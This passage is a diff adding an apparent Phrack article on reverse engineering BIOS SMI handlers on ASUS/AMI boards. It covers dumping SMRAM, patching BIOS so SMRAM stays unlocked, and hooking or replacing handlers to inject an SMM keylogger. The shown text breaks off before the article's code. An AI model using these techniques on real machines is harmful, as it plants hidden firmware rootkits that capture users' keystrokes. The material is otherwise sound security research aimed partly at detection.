@@ -1,0 +1,1694 @@
+				==Phrack Inc.==
+
+		Volume 0x0d, Issue 0x42, Phile #0x0B of 0x11
+
+|=-----------------------------------------------------------------------=|
+|=---=[ A Real SMM Rootkit: Reversing and Hooking BIOS SMI Handlers ]=---=|
+|=-----------------------------------------------------------------------=|
+|=------------------------=[ Filip Wecherowski ]=------------------------=|
+|=--------------=[ core collapse <core_collapse@hush.com> ]=-------------=|
+|=-----------------------------------------------------------------------=|
+                    
+
+          
+--[ ABSTRACT
+
+
+The research provided in this paper describes in details how to reverse
+engineer and modify System Management Interrupt (SMI) handlers in the BIOS
+system firmware and how to implement and detect SMM keystroke logger. This
+work also presents proof of concept code of SMM keystroke logger that uses
+I/O Trap based keystroke interception and a code for detection of such
+keystroke logger.
+
+
+
+--[ INDEX
+
+  1 - INTRODUCTION
+
+  2 - REVERSE ENGINEERING SYSTEM MANAGEMENT INTERRUPT (SMI) HANDLERS
+
+    2.1 - Brief Overview of BIOS Firmware
+    2.2 - Overview of System Management Mode (SMM)
+    2.3 - Extracting binary of BIOS SMI Handlers
+    2.4 - Disassembling SMI Handlers
+    2.5 - Disassembling "main" SMI dispatching function
+    2.6 - Hooking SMI handlers
+
+  3 - SMM KEYLOGGER
+
+    3.1 - Hardware I/O Trap mechanism
+    3.2 - Programming I/O Trap to capture keystrokes
+    3.3 - System Management Mode keylogger payload
+    3.4 - I/O Trap based keystroke logger SMI handler
+    3.5 - Multi-processor keylogger specifics
+
+  4 - SUGGESTED DETECTION METHODS
+
+    4.1 - Detecting I/O Trap based SMM keylogger
+    4.2 - General timing based detection
+
+  5 - CONCLUSION
+
+  6 - SOURCE CODE
+
+    6.1 - I/O Trap based System Management Mode keystroke logger
+    6.2 - Programming I/O Trap
+    6.3 - Detecting I/O Trap SMI keystroke logger
+
+  7 - REFERENCES
+
+             
+
+--[ 1 - INTRODUCTION
+
+
+This work gives an overview of how code works in Systems Management Mode
+and how it can be Hi Jack!ed to inject malicious SMI code. As an example,
+we show how to hijack SMI code and inject SMM keystroke logger payload.
+
+SMM malware as well as security of SMI code in (U)EFI firmware was
+discussed in [efi_hack]. SMM keylogger was first introduced by Sherri
+Sparks and Shawn Embleton at Black Hat USA 2008 [smm_rkt] but very little
+details were provided by the authors regarding how SMI code works, how one
+could hook it and more importantly how would anyone detect such malware.
+
+We use a different technique to enable keystroke logging in SMM than was
+used by [smm_rkt]. We utilize I/O Trap mechanism provided by modern
+chipsets instead of I/O APIC.
+
+We strongly believe that to effectively combat SMM malware in the future
+we need to learn internals of SMM firmware which is a primary motivation
+for writing this article. Until then SMM security will be in a state of
+hysteria. In the paper we also describe some methods to detect the
+presence of SMI keystroke logger.
+
+We do not disclose any vulnerability that would allow injecting malicious
+payload into SMM. The first known SMM exploit was disclosed in [smm],
+another exploit was disclosed in [xen_0wn] (*). Both of them exploited
+insecure hardware configuration programmed by the BIOS system firmware
+that also contains SMI handlers. Thus far, very little research is
+available in the internals of SMI handlers. We believe this is due to
+complexity of their debugging and reverse engineering. This work is
+designed to close this gap regardless of specific vulnerabilities that may
+be used to inject malicious code into SMM.
+
+It should be noted that this work only explores SMI code in the BIOS of
+ASUS motherboards, specifically in ASUS P5Q based on Intel P45 hardware.
+ASUS implements BIOS based on AMIBIOS 8 therefore most of the results of
+this work apply to other motherboard manufacturers that use BIOS firmware
+based on AMI BIOS. Many results are also applicable to motherboards that
+use other BIOS cores because of similarities in implementation of SMI
+handlers in different BIOS firmware. SMM is a x86 feature common for all
+motherboards which also leads to a similar SMI firmware design across
+different BIOS firmware implementations.
+
+(*) While writing this article authors learned about another vulnerability
+discovered in CPU SMRAM caching design [smm_cache].
+
+
+
+--[ 2 - REVERSE ENGINEERING SYSTEM MANAGEMENT INTERRUPT (SMI) HANDLERS
+
+
+
+--[ 2.1 - Brief Overview of BIOS Firmware
+
+
+The first instruction fetched by CPU after reset is located at 0xFFFFFFF0
+address and is mapped to BIOS firmware ROM. This instruction is referred to
+as "reset vector". Reset vector is typically a jump to the first bootstrap
+code, BIOS boot block. Boot block code and reset vector are physically
+residing in BIOS ROM. Access to BIOS ROM is slow compared to DRAM and BIOS
+firmware cannot use writable memory such as stack when executing from ROM
+or flash.
+
+For these reasons BIOS boot block code copies the rest of system BIOS code
+from ROM into DRAM. This process is known as "BIOS shadowing". Shadowed
+system BIOS code and data segments reside in lower DRAM regions below 1MB.
+Main system BIOS code is located in memory ranges 0xE0000 - 0xEFFFF or
+0xF0000 - 0xFFFFF.
+
+BIOS firmware includes not only boot-time code but also firmware that will
+be executing at run-time "in parallel" to the Operating System but in it's
+own "orthogonal" SMRAM memory reserved from the OS. This run-time firmware
+consists of System Management Interrupt (SMI) handlers that execute in
+System Management Mode (SMM) of a CPU.
+
+
+
+--[ 2.2 - Overview of System Management Mode (SMM)
+
+
+Processor switches to System Management Mode (SMM) from protected or
+real-address mode upon receiving System Management Interrupt (SMI) from
+various internal or external devices or generated by software. In response
+to SMI it executes special SMI handler located in System Management RAM
+(SMRAM) region reserved by the BIOS from Operating System for various SMI
+handlers. SMRAM is consisting of several regions contiguous in physical
+memory: compatibility segment (CSEG) fixed to addresses 0xA0000 - 0xBFFFF
+below 1MB or top segment (TSEG) that can reside anywhere in the physical
+memory.
+
+If CPU accesses CSEG while not in SMM mode (regular protected mode code),
+memory controller forwards the access to video memory instead of DRAM.
+Similarly, non-SMM access to TSEG memory is not allowed by the hardware.
+Consequently, access to SMRAM regions is allowed only while processor is
+executing code in SMM mode. At boot time, system BIOS firmware initializes
+SMRAM, decompresses SMI handlers stored in BIOS ROM and copies them to
+SMRAM. BIOS firmware then should "lock" SMRAM to enable its protection
+guaranteed by chipset so that SMI handlers cannot be modified by the OS or
+any other code from this point on.
+
+Upon receiving SMI CPU starts fetching SMI handler instructions from SMRAM
+in big real mode with predefined CPU state. Shortly after that, SMI code
+in modern systems initializes and loads Global Descriptor Table (GDT) and
+transitions CPU to protected mode without paging. SMI handlers can access
+4GB of physical memory. Operating System execution is suspended for the
+entire time SMI handler is executing till it resumes to protected mode and
+restarts OS execution from the point it was interrupted by SMI.
+
+Default treatment of SMI and SMM code by the processor that supports
+virtual machine extensions (for example, Intel VMX) is to leave virtual
+machine mode upon receiving SMI for the entire time SMI handler is
+executing [intel_man]. Nothing can cause CPU to exit to virtual machine
+root (host) mode when in SMM, meaning that Virtual Machine Monitor (VMM)
+does not control/virtualize SMI handlers.
+
+Quite obviously that SMM represents an isolated and "privileged"
+environment and is a target for malware/rootkits. Once malicious code is
+injected into SMRAM, no OS kernel or VMM based anti-virus software can
+protect the system nor can they remove it from SMRAM.
+
+It should be noted that the first study of SMM based rootkits was provided
+in the paper [smm] followed by [phrack_smm] and a proof of concept
+implementation of SMM based keylogger and network backdoor in [smm_rkt].
+
+
+
+--[ 2.3 - Extracting binary of BIOS SMI Handlers
+
+
+There seems to be a common misunderstanding that some "hardware analyzer"
+is required to disassemble SMI handlers. No, it is not. SMI handlers is a
+part of BIOS system firmware and can be disassembled similarly to any BIOS
+code. For detailed information on reversing Award and AMI BIOS, interested
+reader should read this excellent book and series of articles by Pinczakko
+[bios_disasm].
+
+There are two easy ways to dump SMI handlers on a system:
+
+1. Use any vulnerability to directly access SMRAM from protected mode and
+   dump all contents of SMRAM region used by the BIOS (TSEG, High SMRAM or
+   legacy SMRAM region at 0xA0000-0xBFFFF). For instance, if BIOS doesn't
+   lock SMRAM by setting D_LCK bit then SMRAM can be dumped after
+   modifying SMRAMC PCI configuration register as explained in [smm] and
+   [phrack_smm].
+
+   If you are unfortunate and BIOS locks SMRAM and there are no other flaw
+   to use then BIOS firmware can be modified such that it doesn't set D_LCK
+   any more. After re-flashing modified BIOS ROM binary back and booting the
+   system from this BIOS, SMRAM will not be locked and can be dumped from
+   the OS. This, surely, works only if BIOS firmware isn't digitally signed.
+   Oh, we forgot that almost no motherboards use digitally signed non-EFI
+   BIOS firmware.
+   
+   Here's a hint how to find where BIOS firmware sets D_LCK bit. BIOS
+   firmware is most likely using legacy I/O access to PCI configuration
+   registers using 0xCF8/0xCFC ports. To access SMRAMC register BIOS
+   should first write value 0x8000009C to 0xCF8 address port and then a
+   needed value (typically, 0x1A to lock SMRAM) to 0xCFC data port.
+
+2. There's another, probably simpler, way to disassemble SMI handlers, that
+   doesn't require access to SMRAM at run-time. 
+
+   2.1. Dump BIOS firmware binary from BIOS ROM using Flash programmer or
+   simply download the latest BIOS binary from vendor's web site ;). For
+   ASUS P5Q motherboard download P5Q-ASUS-PRO-1613.ROM file.
+
+   2.2. Most of the BIOS firmware including Main BIOS module which
+   contains SMI handlers is compressed. Use tools provided by vendor to
+   extract/decompress the Main BIOS module. ASUS BIOS is based on AMI BIOS
+   so we used AMIBIOS BIOS Module Manipulation Utility, MMTool.exe, to
+   extract the Main BIOS module. Open downloaded .ROM file in MMTool,
+   choose to extract "Single Link Arch BIOS" module (ID=1Bh), check "In
+   uncompressed form" option and save it. This is uncompressed Main BIOS
+   module containing SMI handlers.
+   
+   Check out a resource on modifying AMI BIOS on The Rebels Heaven forum
+   [ami_mod].
+
+   2.3. Once the Main BIOS module is extracted you can start disassembling
+   it to find SMI handlers (for example, using HIEW or IDA Pro). In this
+   paper we hope to provide a starting point for analyzing SMI handlers.
+
+
+So let's jump to disassembling SMI handlers firmware.
+
+
+
+--[ 2.4 - Disassembling SMI Handlers
+
+
+We noticed that ASUS/AMI BIOS uses an array of structures describing
+supported SMI handlers. Each entry in the array starts with signature
+"$SMIxx" where last two characters 'xx' identify specific SMI handler.
+
+Here is SMI dispatch table used by AMIBIOS 8 in ASUS P5Q SE motherboard
+based on Intel's P45 desktop chipset:
+
+ 00065CB0:  00 24 53 4D-49 43 41 00-00 70 B4 00-40 BF 07 00   $SMICA  p_ @.  
+ 00065CC0:  40 20 6E C8-A8 4B 6E C8-A8 24 53 4D-49 53 53 00  @ n..Kn..$SMISS 
+ 00065CD0:  00 B1 B4 00-40 B4 B4 00-40 91 85 C8-A8 B5 85 C8   +_ @__ @':...:.
+ 00065CE0:  A8 24 53 4D-49 50 41 00-00 A8 87 C8-A8 B9 87 C8  .$SMIPA  .+...+.
+ 00065CF0:  A8 B4 88 C8-A8 1C 89 C8-A8 24 53 4D-49 53 49 00  .__.. %..$SMISI 
+ 00065D00:  00 B5 B4 00-40 C7 B4 00-40 63 9F C8-A8 7B 9F C8   ._ @._ @c_..{_.
+ 00065D10:  A8 24 53 4D-49 58 35 00-00 35 DE 00-40 38 DE 00  .$SMIX5  5. @8. 
+ 00065D20:  40 BE 9F C8-A8 D2 9F C8-A8 24 53 4D-49 42 50 00  @__..._..$SMIBP 
+ 00065D30:  00 E4 E0 00-40 F6 E0 00-40 5A A6 C8-A8 80 A6 C8   .. @.. @Z..._..
+ 00065D40:  A8 24 53 4D-49 53 53 00-00 01 E1 00-40 14 E1 00  .$SMISS   . @ . 
+ 00065D50:  40 A0 A6 C8-A8 C6 A6 C8-A8 24 53 4D-49 45 44 00  @........$SMIED 
+ 00065D60:  00 8D E3 00-40 90 E3 00-40 DF A7 C8-A8 F2 A7 C8   _. @_. @.......
+ 00065D70:  A8 24 53 4D-49 46 53 00-00 91 E3 00-40 94 E3 00  .$SMIFS  '. @". 
+ 00065D80:  40 41 A8 C8-A8 53 A8 C8-A8 24 53 4D-49 50 54 00  @A...S...$SMIPT 
+ 00065D90:  00 29 E8 00-40 39 E8 00-40 21 AA C8-A8 33 AA C8   ). @9. @!...3..
+ 00065DA0:  A8 24 53 4D-49 42 53 00-00 55 E8 00-40 58 E8 00  .$SMIBS  U. @X. 
+ 00065DB0:  40 D0 AA C8-A8 12 AB C8-A8 24 53 4D-49 56 44 00  @.... <..$SMIVD 
+ 00065DC0:  00 A3 E8 00-40 A6 E8 00-40 CD AB C8-A8 DD AB C8   _. @.. @.<...<.
+ 00065DD0:  A8 24 53 4D-49 4F 53 00-00 A7 E8 00-40 AA E8 00  .$SMIOS  .. @.. 
+ 00065DE0:  40 CC AC C8-A8 E7 AC C8-A8 24 53 4D-49 42 4F 00  @........$SMIBO 
+ 00065DF0:  00 AB E8 00-40 AE E8 00-40 F7 AC C8-A8 FB AC C8   <. @R. @.......
+ 00065E00:  A8 24 44 45-46 FF 00 01-00 AF E8 00-40 B2 E8 00  .$DEF.   .. @_. 
+ 00065E10:  40 9C B3 C8-A8 A7 B3 C8-A8 53 53 44-54 13 06 00  @__..._..SSDT   
+
+
+Another example, SMI dispatch table on ASUS B50A laptop with Intel mobile
+GM45 express and ICH9M chipset looks similar but has more SMI handlers:
+
+ 0007BE90:  24 53 4D 49-54 44 00 00-92 6D EA 47-9B 6D EA 47  $SMITD  'm.G>m.G
+ 0007BEA0:  10 6B 66 A8-11 6B 66 A8-24 53 4D 49-54 43 00 00   kf. kf.$SMITC  
+ 0007BEB0:  30 7E 66 A8-39 7E 66 A8-3A 7E 66 A8-5F 7E 66 A8  0~f.9~f.:~f._~f.
+ 0007BEC0:  24 53 4D 49-43 41 00 00-B0 89 EA 47-E9 08 EA 47  $SMICA  .%.G. .G
+ 0007BED0:  70 81 66 A8-9B 81 66 A8-24 53 4D 49-53 53 00 00  p_f.>_f.$SMISS  
+ 0007BEE0:  F1 89 EA 47-F4 89 EA 47-B8 95 66 A8-D1 95 66 A8  .%.G.%.G..f...f.
+ 0007BEF0:  24 53 4D 49-53 49 00 00-E4 18 32 5E-F6 18 32 5E  $SMISI  . 2^. 2^
+ 0007BF00:  96 97 66 A8-B4 97 66 A8-24 53 4D 49-58 35 00 00  --f._-f.$SMIX5  
+ 0007BF10:  49 A5 EA 47-4C A5 EA 47-92 9B 66 A8-A6 9B 66 A8  I_.GL_.G'>f..>f.
+ 0007BF20:  24 53 4D 49-42 4E 00 00-96 A7 EA 47-A5 A7 EA 47  $SMIBN  -..G_..G
+ 0007BF30:  9F A1 66 A8-B7 A1 66 A8-24 53 4D 49-42 50 00 00  _.f...f.$SMIBP  
+ 0007BF40:  A6 A7 EA 47-B1 A7 EA 47-79 A3 66 A8-9F A3 66 A8  ...G+..Gy_f.__f.
+ 0007BF50:  24 53 4D 49-45 44 00 00-49 AA EA 47-4C AA EA 47  $SMIED  I..GL..G
+ 0007BF60:  10 A4 66 A8-23 A4 66 A8-24 53 4D 49-46 53 00 00   .f.#.f.$SMIFS  
+ 0007BF70:  4D AA EA 47-50 AA EA 47-72 A4 66 A8-84 A4 66 A8  M..GP..Gr.f.".f.
+ 0007BF80:  24 53 4D 49-50 54 00 00-E1 B7 EA 47-F1 B7 EA 47  $SMIPT  ...G...G
+ 0007BF90:  0C A6 66 A8-1E A6 66 A8-24 53 4D 49-42 53 00 00   .f. .f.$SMIBS  
+ 0007BFA0:  F2 B7 EA 47-FE B7 EA 47-C0 A6 66 A8-4D A7 66 A8  ...G...G..f.M.f.
+ 0007BFB0:  24 53 4D 49-42 4F 00 00-FF B7 EA 47-02 B8 EA 47  $SMIBO  ...G ..G
+ 0007BFC0:  08 A8 66 A8-0C A8 66 A8-24 53 4D 49-43 4D 00 00   .f. .f.$SMICM  
+ 0007BFD0:  5D AD 66 A8-60 AD 66 A8-EF AD 66 A8-F1 AD 66 A8  ]-f.`-f..-f..-f.
+ 0007BFE0:  24 53 4D 49-4C 55 00 00-91 AE 66 A8-94 AE 66 A8  $SMILU  'Rf."Rf.
+ 0007BFF0:  A8 AE 66 A8-B5 AE 66 A8-24 53 4D 49-41 42 00 00  .Rf..Rf.$SMIAB  
+ 0007C000:  4D B0 66 A8-50 B0 66 A8-54 B0 66 A8-67 B0 66 A8  M.f.P.f.T.f.g.f.
+ 0007C010:  24 53 4D 49-47 43 00 00-F0 BB 66 A8-F3 BB 66 A8  $SMIGC  .>f..>f.
+ 0007C020:  F4 BB 66 A8-0A BC 66 A8-24 53 4D 49-50 53 00 00  .>f. _f.$SMIPS  
+ 0007C030:  2C BC 66 A8-32 BC 66 A8-33 BC 66 A8-41 BC 66 A8  ,_f.2_f.3_f.A_f.
+ 0007C040:  24 53 4D 49-50 53 00 00-74 BC 66 A8-7A BC 66 A8  $SMIPS  t_f.z_f.
+ 0007C050:  7B BC 66 A8-86 BC 66 A8-24 53 4D 49-47 44 00 00  {_f.+_f.$SMIGD  
+ 0007C060:  C0 BD 66 A8-C3 BD 66 A8-C4 BD 66 A8-F6 BD 66 A8  ._f.._f.._f.._f.
+ 0007C070:  24 53 4D 49-43 45 00 00-50 BF 66 A8-62 BF 66 A8  $SMICE  P.f.b.f.
+ 0007C080:  72 BF 66 A8-8B BF 66 A8-24 53 4D 49-46 45 00 00  r.f.<.f.$SMIFE  
+ 0007C090:  70 D3 EA 47-7F D3 EA 47-17 C4 66 A8-0C D9 66 A8  p..G..G .f. .f.
+ 0007C0A0:  24 53 4D 49-49 4C 00 00-50 D9 66 A8-55 D9 66 A8  $SMIIL  P.f.U.f.
+ 0007C0B0:  5B D9 66 A8-61 D9 66 A8-24 53 4D 49-43 47 00 00  [.f.a.f.$SMICG  
+ 0007C0C0:  B0 DA 66 A8-B6 DA 66 A8-EB DA 66 A8-17 DB 66 A8  ..f...f...f. .f.
+ 0007C0D0:  24 44 45 46-FF 00 01 00-84 E3 EA 47-87 E3 EA 47  $DEF.   "..G+..G
+ 0007C0E0:  86 E9 66 A8-91 E9 66 A8-00 00 00 01-00 00 00 00  +.f.'.f.        
+
+As a small exercise, download .ROM file for any ASUS EeePC netbook and
+find which SMI handlers are present in the EeePC BIOS.
+
+Both tables have the last structure with '$DEF' signature which describes
+default SMI handler invoked when none of other handlers claimed ownership
+of current SMI. It does nothing more than simply clearing all SMI statuses.
+
+From the above tables we can try to reconstruct contents of each table
+entry:
+
+_smi_handler STRUCT
+  signature		BYTE	'$SMI',?,?
+  some_flags		WORD	0
+  some_ptr0		DWORD	?
+  some_ptr1		DWORD	?
+  some_ptr2		DWORD	?
+  handle_smi_ptr	DWORD	?
+_smi_handler ENDS
+
+Each SMI handler entry in SMI dispatch table starts with signature '$SMI'
+followed by 2 characters specific to SMI handler. Only entry for the
+default SMI handler starts with '$DEF' signature.
+
+Each _smi_handler entry contains several pointers to SMI handler functions.
+The most important pointer occupies last 4 bytes, handle_smi_ptr. It points
+to the main handling function of the corresponding SMI handler.
+
+
+
+--[ 2.5 - Disassembling "main" SMI dispatching function
+
+
+A special SMI dispatch routine (let's name it "dispatch_smi") iterates
+through each SMI handler entry in the table and invokes its handle_smi_ptr.
+If none of the registered SMI handlers claimed ownership of the current SMI
+it invokes handle_smi_ptr routine of $DEF handler.
+
+Below is a disassembly of Handle_SMI BIOS function in ASUS P5Q motherboard:
+
+ 0004AF71: 51                           push        cx
+ 0004AF72: 50                           push        ax
+ 0004AF73: 53                           push        bx
+ 0004AF74: 1E                           push        ds
+ 0004AF75: 06                           push        es
+ 0004AF76: 9A0101C8A8                   call        0A8C8:00101  ---X
+ 0004AF7B: 07                           pop         es
+ 0004AF7C: 1F                           pop         ds
+
+ 0004AF7D: C606670300                   mov         b,[0367],000
+
+ 0004AF82: 803E670301                   cmp         b,[0367],001 ;" "
+ ; je _done_handling_smi
+ 0004AF87: 7438                         je          00004AFC1  --->  (1)
+
+ ;
+ ; load CX with number of supported SMI handlers
+ ; done handling SMI if 0
+ ;
+ 0004AF89: 8B0E6003                     mov         cx,[0360]
+ ; jcxz _done_handling_smi
+ 0004AF8D: E332                         jcxz        00004AFC1  --->  (2)
+
+ _iterate_thru_handlers:
+
+ ;
+ ; load GS with index of SMI handler table segment in GDT
+ ; and decrement number of SMI handlers to try
+ ;
+ 0004AF8F: 6828B4                       push        0B428 ;"_("
+ 0004AF92: 0FA9                         pop         gs
+ 0004AF94: 33FF                         xor         di,di
+
+ ;
+ ; handle next SMI
+ ;
+ _handle_next_smi:
+
+ 0004AF96: 49                           dec         cx
+
+ ;
+ ; check some_flags from current _smi_handler entry in the table
+ ;
+ 0004AF97: 658B4506                     mov         ax,gs:[di][06]
+ 0004AF9B: 83E001                       and         ax,001 ;" "
+ 0004AF9E: 7413                         je          00004AFB3  --->  (3)
+
+ 0004AFA0: 51                           push        cx
+ 0004AFA1: 0FA8                         push        gs
+ 0004AFA3: 57                           push        di
+
+ ;
+ ; call SMI handler, handle_smi_ptr of the current
+ ; _smi_handler entry in the dispatch table
+ ;
+ 0004AFA4: 65FF5D14                     call        d,gs:[di][14]
+
+ 0004AFA8: 5F                           pop         di
+ 0004AFA9: 0FA9                         pop         gs
+ 0004AFAB: 59                           pop         cx
+
+ ; jcxz _done_handling_smi
+ 0004AFAC: E313                         jcxz        00004AFC1  --->  (4)
+ 0004AFAE: 83F800                       cmp         ax,000
+ 0004AFB1: 7407                         je          00004AFBA  --->  (5)
+ 0004AFB3: BB1800                       mov         bx,00018 ;"  "
+ 0004AFB6: 03FB                         add         di,bx
+
+ ;
+ ; try next SMI handler entry
+ ;
+ 0004AFB8: EBDC                         jmps        00004AF96  --->  (6) 
+							; _handle_next_smi
+
+ 0004AFBA: B80000                       mov         ax,00000
+ 0004AFBD: 0BC0                         or          ax,ax
+ 0004AFBF: 75C1                         jne         00004AF82  --->  (7)
+
+ ;
+ ; SMI either handled or corresponding handler was not found
+ ; and default handler executed
+ ;
+ _done_handling_smi:
+
+ 0004AFC1: 5B                           pop         bx
+ 0004AFC2: 58                           pop         ax
+ 0004AFC3: 59                           pop         cx
+ 0004AFC4: 5F                           pop         di
+ 0004AFC5: 0FA9                         pop         gs
+ 0004AFC7: CB                           retf
+
+
+
+--[ 2.6 - Hooking SMI handlers
+
+
+Based on the above, there are several ways to hook SMI handlers to add a
+rootkit functionality: add a new SMI handler or patch one of the existing
+SMI handlers. While these two methods aren't significantly different, we
+consider both of them.
+
+1. Adding your own SMI handler and a new entry to SMI dispatch table.
+
+To add a new SMI handler we have to add a new entry to SMI dispatch table.
+Let's add entry with signature '$SMIaa' to the table just before the entry
+for the default SMI handler $DEF:
+
+ 00065E00:  A8 24 53 4D-49 61 61 00-00 AF E8 00-40 B2 E8 00  .$SMIaa  .. @_.
+ 00065E10:  40 9C B3 C8-A8 A7 B3 C8-A8 53 53 44-54 13 06 00  @__..._..SSDT   
+
+This entry contains pointers to default SMI handler functions that may be
+patched. Another method is to find a free space in SMRAM, put shellcode
+there and replace pointers to default SMI handler functions with pointers
+to SMI shellcode.
+
+Additionally, SMI code saves number of active SMI handlers into a variable
+in SMRAM data segment that also should be incremented if a new SMI handler
+is injected.
+
+2. Patching one of the existing SMI handlers.
+
+Let's describe patching existing SMI handler in more details.
+
+Although all BIOS we analyzed are based on the same AMIBIOS 8 core, we
+found that number of $SMI entries in SMI handler tables vary depending on
+motherboard manufacturer and model, chipset manufacturer and model, and
+even on whether it's mobile or server motherboard. SMI handlers typically
+serve as hardware management functions or workaround for hardware bugs.
+Different systems have different needs and therefore different types of
+SMI handlers are present in the BIOS firmware.
+
+Interestingly, some of SMI handlers appear to exist in all BIOS based on
+AMIBIOS 8. Specifically handlers with the following entries in SMI
+dispatch table: $SMICA, $SMISS, $SMISI, $SMIX5, $SMIBP, $SMIED, $SMIFS,
+$SMIBS and obviously $DEF.
+
+The first choice would be to replace one of the SMI handlers present in
+every BIOS based on AMIBIOS 8 core, such as $SMISS. BIOS for ASUS P5Q
+motherboard has $SMISS handler at 000490D3 offset of system BIOS code.
+Below is a snippet of $SMISS handler disassembly:
+
+handle_smi_ss:
+
+ 000490D3: 0E                           push        cs
+ 000490D4: E8D8FF                       call        0000490AF  ---  (1)
+ 000490D7: B80100                       mov         ax,00001 ;"  "
+ 000490DA: 0F82F400                     jb          0000491D2  ---  (2)
+ 000490DE: B81034                       mov         ax,03410 ;"4 "
+
+ ..
+
+ 000491CA: 9AFB00C8A8                   call        0A8C8:000FB  ---X
+ 000491CF: B80000                       mov         ax,00000
+ 000491D2: CB                           retf
+
+After some time spent on reverse engineering this handler one should be
+able to recognize it as a code handling Sleep State requests. It turns out
+that replacing one of the existing SMI handlers may leave the system
+without important functionality or even make the system unstable.
+
+Replacing default SMI handler ($DEF) may be possible if injected payload
+is designed to handle an SMI that isn't supported by the current BIOS. In
+this case no existing SMI handler will claim the SMI and default handler
+will be executed.
+
+Default handler is very basic and has very limited space so it may be
+better to find another victim handler that has more space, present in SMM
+of all BIOS firmware and doesn't implement useful functionality.
+
+Sounds impossible but.. ;) Let's take a look at the SMI handler with
+signature $SMIED. This SMI handler handles software SMI generated by
+writing 0xDE value to APMC port 0xB2:
+
+   _outpd( 0xb2, 0xDE );
+
+It doesn't seem to do anything meaningful but it exists and is the same in
+every BIOS we examined. The purpose of this SMI handler is not entirely
+clear. It seems to be used for debugging.
+
+First of all, we need to find $SMIED handler routines in BIOS binary. SMI
+handlers are trivial to locate, if main routine is found for at least one
+SMI handler in the BIOS binary (remember handle_smi_ptr pointer in
+SMI_HANDLER structure). 
+
+Assume we know location of handle_smi_ss function of $SMISS SMI handler
+described above. This location is offset 0x000490D3 in the system BIOS
+binary.
+
+The last 4 bytes of $SMISS entry in SMI dispatch table are "B5 85 C8 A8"
+which makes handle_smi_ptr = 0xA8C885B5. This is a linear address of the
+main function of $SMISS handler. The last 4 bytes of $SMIED entry in SMI
+dispatch table are "F2 A7 C8 A8" hence the handle_smi_ptr = 0xA8C8A7F2.
+
+This is a linear address of the main function of $SMIED handler. Delta
+between these two linear addresses is 0x223D. By adding this delta to the
+offset of $SMISS SMI handler in the BIOS binary, one can calculate the
+offset of main function of $SMIED or any other SMI handler in the BIOS
+binary.
+
+0x000490D3 + 0x223D = 0x0004B310
+
+Any other SMI handler can be used instead of $SMISS, for example $DEF SMI
+handler which should be the same in all BIOS binaries.
+
+Here's the main function of $SMIED SMI handler:
+
+ 0004B2FD: 50                           push        ax
+ 0004B2FE: E8CCFD                       call        00004B0CD  --- > (1)
+ 0004B301: 720A                         jb          00004B30D  --- > (2)
+ 0004B303: 3CDE                         cmp         al,0DE
+ 0004B305: 7506                         jne         00004B30D  --- > (3)
+ 0004B307: E8E0FD                       call        00004B0EA  --- > (4)
+ 0004B30A: F8                           clc
+ 0004B30B: 58                           pop         ax
+ 0004B30C: CB                           retf
+ 0004B30D: F9                           stc
+ 0004B30E: 58                           pop         ax
+ 0004B30F: CB                           retf
+
+handle_smi_ed:
+
+ 0004B310: 0E                           push        cs
+ 0004B311: E8E9FF                       call        00004B2FD  --- > (5)
+ 0004B314: B80100                       mov         ax,00001 ;"  "
+ 0004B317: 7245                         jb          00004B35E  --- > (6)
+ 0004B319: 6660                         pushad
+ 0004B31B: 1E                           push        ds
+ 0004B31C: 06                           push        es
+ 0004B31D: 680070                       push        07000 ;"p "
+ 0004B320: 1F                           pop         ds
+ 0004B321: 33FF                         xor         di,di
+ 0004B323: 6828B4                       push        0B428 ;"_("
+ 0004B326: 07                           pop         es
+ 0004B327: 33F6                         xor         si,si
+ 0004B329: 268B04                       mov         ax,es:[si]
+ 0004B32C: 8905                         mov         [di],ax
+ 0004B32E: 268B04                       mov         ax,es:[si]
+ 0004B331: 3D2444                       cmp         ax,04424 ;"D$"
+ 0004B334: 750C                         jne         00004B342  --- > (7)
+ 0004B336: BB0200                       mov         bx,00002 ;"  "
+ 0004B339: 268B4402                     mov         ax,es:[si][02]
+ 0004B33D: 3D4546                       cmp         ax,04645 ;"FE"
+ 0004B340: 7408                         je          00004B34A  --- > (8)
+ 0004B342: 83C602                       add         si,002 ;" "
+ 0004B345: 83C702                       add         di,002 ;" "
+ 0004B348: EBDF                         jmps        00004B329  --- > (9)
+ 0004B34A: 268B00                       mov         ax,es:[bx][si]
+ 0004B34D: 8901                         mov         [bx][di],ax
+ 0004B34F: 83C302                       add         bx,002 ;" "
+ 0004B352: 83FB0A                       cmp         bx,00A ;" "
+ 0004B355: 75F3                         jne         00004B34A  --- > (A)
+ 0004B357: 07                           pop         es
+ 0004B358: 1F                           pop         ds
+ 0004B359: 6661                         popad
+ 0004B35B: B80000                       mov         ax,00000
+ 0004B35E: CB                           retf
+
+
+The only thing above "debug" SMI handler does is it simply copies the
+entire SMI dispatch table from 0x0B428:[si] to 0x07000:[di].
+
+So it seems logical and safe to patch this handler routine with our own
+SMI shellcode. The SMI shellcode may be different depending on the
+purpose. We inject SMI keystroke logger similarly to [smm_rkt].
+
+Before we jump to details of SMI keystroke logger handler implementation
+let's discuss methods tha can be used to invoke this SMI keylogger handler
+when keys are pressed on a keyboard.
+
+1. Routing keyboard hardware interrupt (IRQ #01) to SMI using I/O APIC
+
+Authors of [smm_rkt] used I/O Advanced Programmable Interrupt Controller
+(I/O APIC) to redirect keyboard controller hardware interrupt IRQ #01 to
+SMI and capture keystrokes inside hooked SMI handler.
+
+For details of using this method please refer to [smm_rkt]. For details
+on I/O and Local APIC programming, please refer to Chapter 8 of Intel(r)
+IA-32 Architecture Software Developer's Manual [intel_man] or search for
+"APIC programming".
+
+2. I/O Trap on access to keyboard controller data port 0x60
+
+We initially started to use entirely different technique to intercept
+pressed keys in SMI - I/O Trap. It should be noted that this method is
+traditionally used in the BIOS to emulate legacy PS/2 keyboard. Let's
+describe this method in greater details in the next section.
+
+
+
+--[ 3 - SMM KEYLOGGER
+
+
+
+--[ 3.1 - Hardware I/O Trap mechanism
+
+
+One of the ways to implement OS kernel keystroke logger is to hook debug
+trap handler #DB in Interrupt Descriptor Table (IDT) and program hardware
+debug registers DR0-DR3 to trap on access to keyboard controller data port
+0x60.
+
+There has to be similar way to trap into SMI upon access to keyboard I/O
+ports. And, miraculously, there is one - I/O ports 60/64 emulation for the
+USB keyboard. For instance, let's consult to whitepaper describing USB
+support for AMI BIOS [ami_usb]. There we can find the following quote:
+
+[snip]
+
+2.5.4 Port 64/60 Emulation
+This option enables/disables the "Port 60h/64h" trapping option. Port
+60h/64h trapping allows the BIOS to provide full PS/2 based legacy support
+for the USB keyboard and mouse. This option is useful for Microsoft
